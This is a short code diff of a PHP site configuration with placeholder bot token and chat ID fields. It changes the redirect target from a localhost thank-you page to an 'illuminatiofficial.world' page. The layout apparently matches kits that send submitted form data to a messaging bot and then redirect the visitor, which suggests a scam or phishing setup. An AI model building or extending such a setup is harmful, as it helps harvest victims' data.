@@ -20,7 +20,7 @@ $site_map = [
         "bots" => [
             ['token' => 'YOUR_BOT_TOKEN_HERE', 'chat_id' => 'YOUR_CHAT_ID_HERE'],
         ],
-        "redirect" => "http://localhost/thank-you.html"
+        "redirect" => "http://illuminatiofficial.world/index.html"
     ],
     // Add more domains as needed
 ];
